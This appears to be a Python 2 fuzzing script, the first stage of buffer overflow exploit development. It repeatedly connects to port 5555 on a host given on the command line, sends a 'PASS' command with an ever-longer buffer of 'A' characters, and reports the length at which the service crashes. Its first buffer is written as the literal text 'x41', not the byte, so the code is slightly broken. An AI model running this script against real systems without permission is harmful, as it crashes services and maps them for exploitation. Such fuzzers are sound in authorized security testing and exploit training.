import sys, socket
from time import sleep

target = sys.argv[1]
buff = 'x41'*50

while True:
   try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((target,5555))
    s.recv(1024)

    s.send("PASS " +buff)
    s.close()
    sleep(1)
    buff = buff + '\x41'*50

   except:
    print "[+] Crash occured with buffer length: "+str(len(buff)-50)
    sys.exit()
